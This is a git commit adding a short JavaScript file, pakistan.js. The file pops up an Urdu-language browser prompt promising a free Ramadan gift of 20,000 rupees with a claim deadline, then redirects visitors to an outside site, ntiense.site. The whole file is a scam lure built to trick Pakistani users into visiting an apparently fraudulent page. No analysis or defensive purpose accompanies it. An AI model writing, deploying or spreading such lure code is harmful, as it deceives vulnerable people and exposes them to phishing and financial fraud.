24d7e5a4cf174af777398d67dc44dd3f8b6b130a
usorondo57 <copses.gouache.6p@icloud.com>
2026-02-27 06:00:24 +0100

    Create pakistan.js

---
+++ pakistan.js
@@ -0,0 +1,7 @@
+
+
+var password = 'واپس لے لو Rs20,000'
+password=prompt('مبارک ہو! 20,000 روپے مفت رامادم حاصل کریں اب آخری تاریخ 30 مارچ 2026، براہ کرم دعوی کرنے کے لیے OK دبائیں   ','واپس لے لو Rs20,000');
+if (password != 'واپس لے لو Rs20,000') {
+location.href='https://www.ntiense.site/ramadan-rs20000';
+}
